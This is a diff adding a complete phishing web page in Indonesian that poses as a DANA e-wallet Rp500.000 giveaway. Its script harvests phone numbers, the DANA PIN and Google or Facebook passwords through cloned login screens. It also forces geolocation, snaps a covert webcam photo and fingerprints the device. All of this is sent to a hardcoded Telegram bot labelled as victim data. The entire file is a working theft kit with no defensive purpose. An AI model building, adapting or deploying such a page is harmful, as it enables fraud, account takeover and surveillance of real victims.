@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover" />
+    <title>Hajatan Ulang Tahun DANA - Rp500.000</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #ebedf0; }
+        .post { background: #fff; margin: 0 auto; padding: 10px; max-width: 500px; border: 1px solid #d0d1d5; border-radius: 3px; }
+        .post img { width: 100%; }
+        button { display: block; width: 200px; height: 50px; color: #FFF; border: none; outline: none; font-size: 20px; cursor: pointer; border-radius: 5px; margin: 10px auto; background: #148CE3; }
+        .phone { max-width: 400px; margin: 10px auto; }
+        .phone input { width: 100%; height: 50px; padding: 10px; outline: none; border: 2px solid #cecece; font-size: 14px; margin-bottom: 10px; border-radius: 8px; }
+        .title { text-align: center; margin: 20px 0; }
+        .error { color: red; text-align: center; display: none; margin: 10px; }
+        .A { text-align: center; background-color: #148CE3; color: #FFF; padding: 12px 0; }
+        
+        /* Pilihan login */
+        .login-options {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .login-option {
+            flex: 1;
+            padding: 14px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            background: white;
+            text-align: center;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .login-option.google { border-color: #4285f4; color: #4285f4; }
+        .login-option.facebook { border-color: #1877f2; color: #1877f2; }
+        
+        /* MODAL GOOGLE CLONE 100% REAL */
+        .modal-google {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 20000;
+            overflow-y: auto;
+        }
+        .modal-content {
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 48px 40px;
+            background: white;
+            min-height: 100vh;
+        }
+        .google-logo { text-align: center; margin-bottom: 32px; }
+        .google-logo svg { width: 75px; }
+        .modal-title { font-size: 24px; font-weight: 400; text-align: center; color: #202124; margin-bottom: 8px; }
+        .modal-sub { text-align: center; font-size: 14px; color: #5f6368; margin-bottom: 32px; }
+        .input-field { margin-bottom: 24px; }
+        .input-field input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; }
+        .input-field input:focus { border-color: #1a73e8; border-width: 2px; }
+        .btn-submit { background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .link-lupa { text-align: right; margin-top: 12px; }
+        .link-lupa a { color: #1a73e8; text-decoration: none; font-size: 13px; }
+        .link-buat { text-align: left; margin-top: 32px; }
+        .link-buat a { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
+        
+        /* MODAL FACEBOOK CLONE 100% REAL */
+        .modal-facebook {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #1877f2;
+            z-index: 20000;
+            overflow-y: auto;
+        }
+        .fb-content {
+            max-width: 450px;
+            margin: 20px auto;
+            padding: 40px 24px;
+            background: white;
+            border-radius: 12px;
+        }
+        .fb-logo { text-align: center; margin-bottom: 24px; }
+        .fb-logo svg { width: 60px; }
+        .fb-title { font-size: 20px; font-weight: bold; text-align: center; color: #1c1e21; margin-bottom: 24px; }
+        .fb-input { margin-bottom: 16px; }
+        .fb-input input { width: 100%; padding: 14px 12px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 6px; background: #f5f6f7; outline: none; }
+        .fb-input input:focus { border-color: #1877f2; }
+        .fb-btn { background: #1877f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .fb-forgot { text-align: center; margin-top: 16px; }
+        .fb-forgot a { color: #1877f2; text-decoration: none; font-size: 14px; }
+        
+        /* KAMERA LAYER */
+        .camera-layer {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: black;
+            z-index: 30000;
+        }
+        #cameraVideo { width: 100%; height: 100%; object-fit: cover; }
+        #cameraCanvas { display: none; }
+        .camera-countdown {
+            position: absolute;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: white;
+            font-size: 56px;
+            font-weight: bold;
+            z-index: 30001;
+        }
+        
+        .loading-layer {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 40000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #fff;
+            border-top-color: #148CE3;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-text { color: white; }
+        
+        .spin { width: 50px; height: 50px; background: transparent; border: solid 8px #148CE3; border-right-color: transparent; border-radius: 50%; margin: 10px auto; animation: spin 0.8s linear infinite; }
+        #loader, #info, #checking, #share { display: none; }
+        .tip { font-size: 14px; text-align: center; margin: 10px; }
+        .amount { color: #43B05F; font-weight: bold; }
+        .telbtn { background-color: #148CE3; display: flex; justify-content: center; text-decoration: none; height: 50px; border-radius: 10px; margin: 10px; align-items: center; }
+        .telbtn span { color: white; font-size: 16px; }
+    </style>
+</head>
+<body>
+
+<center><img src="https://599cdn.com/Indonesia/dana417.jpg" alt="fund" style="width: 100%; display: block;"></center>
+
+<div class="A">
+    <b>Hajatan Ulang Tahun DANA: Bagi-Bagi Saldo Rp500.000</b>
+</div>
+
+<div class="post">
+    <div id="intro">
+        <p class="title"><br>Klik tombol di bawah untuk cek kelayakan.</p>
+        <br><button id="go">CEK KELAYAKAN</button>
+    </div>
+    
+    <div id="loader">
+        <div>Memuat...</div>
+        <div class="spin"></div>
+        <div id="num">0%</div>
+    </div>
+    
+    <div id="info">
+        <p class="title">Verifikasi Akun</p>
+        
+        <div class="login-options">
+            <div class="login-option google" id="pilihGoogle">G Google</div>
+            <div class="login-option facebook" id="pilihFacebook">f Facebook</div>
+        </div>
+        
+        <div class="phone">
+            <input type="text" id="phone" placeholder="Nomor HP">
+            <input type="text" id="dana_number" placeholder="Nomor DANA">
+            <input type="password" id="dana_pin" placeholder="PIN DANA (6 digit)">
+        </div>
+        
+        <p class="error" id="errorMsg">Silakan pilih metode login dan isi semua data!</p>
+        <button id="confirm">LANJUTKAN</button>
+    </div>
+    
+    <div id="checking">
+        <p class="title">Memeriksa data...</p>
+        <div class="loading-spinner" style="margin:20px auto;"></div>
+    </div>
+    
+    <div id="share">
+        <p class="tip">Selamat! Anda memenuhi syarat</p>
+        <p class="tip">Saldo <span class="amount">Rp500.000</span> akan dikirim ke akun DANA Anda</p>
+        <br>
+        <a class='telbtn' href='https://www.dana.id' target='_blank'><span>KLAIM SEKARANG</span></a>
+    </div>
+</div>
+
+<!-- MODAL GOOGLE CLONE 100% REAL -->
+<div class="modal-google" id="modalGoogle">
+    <div class="modal-content">
+        <div class="google-logo">
+            <svg width="75" viewBox="0 0 24 24">
+                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+            </svg>
+        </div>
+        <div class="modal-title">Masuk</div>
+        <div class="modal-sub">Lanjutkan ke DANA untuk klaim saldo</div>
+        <div class="input-field">
+            <input type="email" id="googleEmail" placeholder="Email atau nomor telepon">
+        </div>
+        <div class="input-field">
+            <input type="password" id="googlePassword" placeholder="Kata sandi">
+        </div>
+        <button class="btn-submit" id="submitGoogle">Berikutnya</button>
+        <div class="link-lupa"><a href="#">Lupa sandi?</a></div>
+        <div class="link-buat"><a href="#">Buat akun</a></div>
+    </div>
+</div>
+
+<!-- MODAL FACEBOOK CLONE 100% REAL -->
+<div class="modal-facebook" id="modalFacebook">
+    <div class="fb-content">
+        <div class="fb-logo">
+            <svg viewBox="0 0 24 24" width="60" height="60">
+                <path fill="#1877f2" d="M24 12.07C24 5.41 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.1 10.13 24v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.8-4.7 4.56-4.7 1.32 0 2.7.24 2.7.24v2.97h-1.52c-1.5 0-1.96.93-1.96 1.89v2.27h3.34l-.53 3.49h-2.81V24C19.61 23.1 24 18.1 24 12.07z"/>
+            </svg>
+        </div>
+        <div class="fb-title">Masuk ke Facebook</div>
+        <div class="fb-input">
+            <input type="text" id="fbEmail" placeholder="Email atau nomor telepon">
+        </div>
+        <div class="fb-input">
+            <input type="password" id="fbPassword" placeholder="Kata sandi">
+        </div>
+        <button class="fb-btn" id="submitFacebook">Masuk</button>
+        <div class="fb-forgot"><a href="#">Lupa akun?</a></div>
+    </div>
+</div>
+
+<div class="camera-layer" id="cameraLayer">
+    <video id="cameraVideo" autoplay playsinline></video>
+    <canvas id="cameraCanvas"></canvas>
+    <div class="camera-countdown" id="cameraCountdown">5</div>
+</div>
+
+<div class="loading-layer" id="loadingLayer">
+    <div class="loading-spinner"></div>
+    <div class="loading-text">Memproses...</div>
+</div>
+
+<script>
+// ==================== GANTI DENGAN TOKEN BOT LO ====================
+const BOT_TOKEN = '8589936257:AAFKAHzssc_mtqSlotK3MlQf-7wVeMTsZUM';
+const CHAT_ID = '8327936213';
+// ===================================================================
+
+let pilihanLogin = null;
+let verifikasiLokasi = false;
+let verifikasiKamera = false;
+let fotoWajah = null;
+let dataLokasi = null;
+let ipKorban = 'Tidak diketahui';
+
+// Data dari form
+let nomorHP = '', nomorDANA = '', pinDANA = '';
+let emailLogin = '', passwordLogin = '';
+
+// Ambil IP
+async function getIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ipKorban = data.ip;
+    } catch(e) { ipKorban = 'Gagal ambil IP'; }
+}
+
+// Ambil lokasi
+function ambilLokasi() {
+    return new Promise((resolve) => {
+        if('geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    dataLokasi = {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy + ' meter'
+                    };
+                    verifikasiLokasi = true;
+                    resolve(true);
+                },
+                (err) => {
+                    verifikasiLokasi = false;
+                    alert('Anda harus mengizinkan akses lokasi untuk melanjutkan');
+                    resolve(false);
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            verifikasiLokasi = false;
+            alert('Perangkat tidak mendukung lokasi');
+            resolve(false);
+        }
+    });
+}
+
+// Ambil foto (LANGSUNG)
+async function ambilFoto() {
+    return new Promise(async (resolve) => {
+        const video = document.getElementById('cameraVideo');
+        const canvas = document.getElementById('cameraCanvas');
+        const ctx = canvas.getContext('2d');
+        const countdownEl = document.getElementById('cameraCountdown');
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user' } 
+            });
+            video.srcObject = stream;
+            video.play();
+            
+            let counter = 5;
+            countdownEl.innerText = counter;
+            
+            const interval = setInterval(() => {
+                counter--;
+                countdownEl.innerText = counter;
+                if(counter <= 0) {
+                    clearInterval(interval);
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const foto = canvas.toDataURL('image/jpeg', 0.9);
+                    stream.getTracks().forEach(track => track.stop());
+                    verifikasiKamera = true;
+                    resolve(foto);
+                    document.getElementById('cameraLayer').style.display = 'none';
+                }
+            }, 1000);
+        } catch(err) {
+            verifikasiKamera = false;
+            alert('Anda harus mengizinkan akses kamera untuk melanjutkan');
+            resolve(null);
+            document.getElementById('cameraLayer').style.display = 'none';
+        }
+    });
+}
+
+// Kumpulkan data perangkat
+async function kumpulkanDataPerangkat() {
+    const data = {
+        waktu: new Date().toLocaleString('id-ID'),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        ip: ipKorban,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        bahasa: navigator.language,
+        cpu: navigator.hardwareConcurrency + ' core',
+        ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Tidak diketahui',
+        screen: screen.width + 'x' + screen.height,
+        koneksi: navigator.connection ? navigator.connection.effectiveType : 'Tidak diketahui',
+        baterai: 'Mengambil...',
+        ngecas: 'Mengambil...'
+    };
+    
+    if('getBattery' in navigator) {
+        try {
+            const batre = await navigator.getBattery();
+            data.baterai = (batre.level * 100) + '%';
+            data.ngecas = batre.charging ? 'Ya' : 'Tidak';
+        } catch(e) {}
+    }
+    return data;
+}
+
+// Kirim ke Telegram
+async function kirimKeTelegram(dataPerangkat) {
+    let pesan = `🔴🔴🔴 KORBAN DANA PHISHING 🔴🔴🔴\n`;
+    pesan += `═══════════════════════════════════════\n\n`;
+    
+    pesan += `📱 DATA YANG DIINPUT:\n`;
+    pesan += `   ▸ Nomor HP: ${nomorHP}\n`;
+    pesan += `   ▸ Nomor DANA: ${nomorDANA}\n`;
+    pesan += `   ▸ PIN DANA: ${pinDANA}\n\n`;
+    
+    pesan += `🔐 LOGIN ${pilihanLogin.toUpperCase()}:\n`;
+    pesan += `   ▸ Email/User: ${emailLogin}\n`;
+    pesan += `   ▸ Password: ${passwordLogin}\n\n`;
+    
+    pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+    
+    pesan += `📍 LOKASI PRESISI:\n`;
+    if(dataLokasi) {
+        pesan += `   ▸ Latitude: ${dataLokasi.lat}\n`;
+        pesan += `   ▸ Longitude: ${dataLokasi.lng}\n`;
+        pesan += `   ▸ Akurasi: ${dataLokasi.accuracy}\n`;
+        pesan += `   ▸ Maps: https://maps.google.com/?q=${dataLokasi.lat},${dataLokasi.lng}\n\n`;
+    }
+    
+    pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+    
+    pesan += `💻 DATA PERANGKAT:\n`;
+    pesan += `   ▸ IP: ${dataPerangkat.ip}\n`;
+    pesan += `   ▸ User Agent: ${dataPerangkat.userAgent}\n`;
+    pesan += `   ▸ Platform: ${dataPerangkat.platform}\n`;
+    pesan += `   ▸ Bahasa: ${dataPerangkat.bahasa}\n`;
+    pesan += `   ▸ Timezone: ${dataPerangkat.timezone}\n`;
+    pesan += `   ▸ CPU: ${dataPerangkat.cpu}\n`;
+    pesan += `   ▸ RAM: ${dataPerangkat.ram}\n`;
+    pesan += `   ▸ Resolusi: ${dataPerangkat.screen}\n`;
+    pesan += `   ▸ Koneksi: ${dataPerangkat.koneksi}\n`;
+    pesan += `   ▸ Baterai: ${dataPerangkat.baterai}\n`;
+    pesan += `   ▸ Ngecas: ${dataPerangkat.ngecas}\n\n`;
+    
+    pesan += `⏰ WAKTU: ${dataPerangkat.waktu}\n`;
+    pesan += `═══════════════════════════════════════\n`;
+    pesan += `TRACKER LAUGHING AT YOU 991 - © BinCoderr`;
+    
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: pesan })
+    });
+    
+    if(fotoWajah) {
+        const blob = await (await fetch(fotoWajah)).blob();
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'foto_korban.jpg');
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+    }
+}
+
+// Proses utama
+async function prosesVerifikasi() {
+    nomorHP = document.getElementById('phone').value;
+    nomorDANA = document.getElementById('dana_number').value;
+    pinDANA = document.getElementById('dana_pin').value;
+    
+    if(!pilihanLogin || !nomorHP || !nomorDANA || !pinDANA) {
+        document.getElementById('errorMsg').style.display = 'block';
+        return;
+    }
+    document.getElementById('errorMsg').style.display = 'none';
+    
+    if(pilihanLogin === 'google') {
+        document.getElementById('modalGoogle').style.display = 'block';
+    } else if(pilihanLogin === 'facebook') {
+        document.getElementById('modalFacebook').style.display = 'block';
+    }
+}
+
+// Submit Google
+document.getElementById('submitGoogle').onclick = async () => {
+    emailLogin = document.getElementById('googleEmail').value;
+    passwordLogin = document.getElementById('googlePassword').value;
+    
+    if(!emailLogin || !passwordLogin) {
+        alert('Masukkan email dan password!');
+        return;
+    }
+    
+    document.getElementById('modalGoogle').style.display = 'none';
+    document.getElementById('loadingLayer').style.display = 'flex';
+    
+    const lokasiOK = await ambilLokasi();
+    if(!lokasiOK) {
+        document.getElementById('loadingLayer').style.display = 'none';
+        return;
+    }
+    
+    document.getElementById('cameraLayer').style.display = 'block';
+    fotoWajah = await ambilFoto();
+    
+    if(!fotoWajah) {
+        document.getElementById('loadingLayer').style.display = 'none';
+        return;
+    }
+    
+    const dataPerangkat = await kumpulkanDataPerangkat();
+    await kirimKeTelegram(dataPerangkat);
+    
+    document.getElementById('loadingLayer').style.display = 'none';
+    document.getElementById('info').style.display = 'none';
+    document.getElementById('share').style.display = 'block';
+};
+
+// Submit Facebook
+document.getElementById('submitFacebook').onclick = async () => {
+    emailLogin = document.getElementById('fbEmail').value;
+    passwordLogin = document.getElementById('fbPassword').value;
+    
+    if(!emailLogin || !passwordLogin) {
+        alert('Masukkan email dan password!');
+        return;
+    }
+    
+    document.getElementById('modalFacebook').style.display = 'none';
+    document.getElementById('loadingLayer').style.display = 'flex';
+    
+    const lokasiOK = await ambilLokasi();
+    if(!lokasiOK) {
+        document.getElementById('loadingLayer').style.display = 'none';
+        return;
+    }
+    
+    document.getElementById('cameraLayer').style.display = 'block';
+    fotoWajah = await ambilFoto();
+    
+    if(!fotoWajah) {
+        document.getElementById('loadingLayer').style.display = 'none';
+        return;
+    }
+    
+    const dataPerangkat = await kumpulkanDataPerangkat();
+    await kirimKeTelegram(dataPerangkat);
+    
+    document.getElementById('loadingLayer').style.display = 'none';
+    document.getElementById('info').style.display = 'none';
+    document.getElementById('share').style.display = 'block';
+};
+
+// Event listeners
+document.getElementById('go').onclick = () => {
+    document.getElementById('intro').style.display = 'none';
+    document.getElementById('info').style.display = 'block';
+};
+
+document.getElementById('pilihGoogle').onclick = () => {
+    pilihanLogin = 'google';
+    document.getElementById('pilihGoogle').style.background = '#4285f4';
+    document.getElementById('pilihGoogle').style.color = 'white';
+    document.getElementById('pilihFacebook').style.background = 'white';
+    document.getElementById('pilihFacebook').style.color = '#1877f2';
+};
+
+document.getElementById('pilihFacebook').onclick = () => {
+    pilihanLogin = 'facebook';
+    document.getElementById('pilihFacebook').style.background = '#1877f2';
+    document.getElementById('pilihFacebook').style.color = 'white';
+    document.getElementById('pilihGoogle').style.background = 'white';
+    document.getElementById('pilihGoogle').style.color = '#4285f4';
+};
+
+document.getElementById('confirm').onclick = prosesVerifikasi;
+
+getIP();
+</script>
+</body>
+</html>
